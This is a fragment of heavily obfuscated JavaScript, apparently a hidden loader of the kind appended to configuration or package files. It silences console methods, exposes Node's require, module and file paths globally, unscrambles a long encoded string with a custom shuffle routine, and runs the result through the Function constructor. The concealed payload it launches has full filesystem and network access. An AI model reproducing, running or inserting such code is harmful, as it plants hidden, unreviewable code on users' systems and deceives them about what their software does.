a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
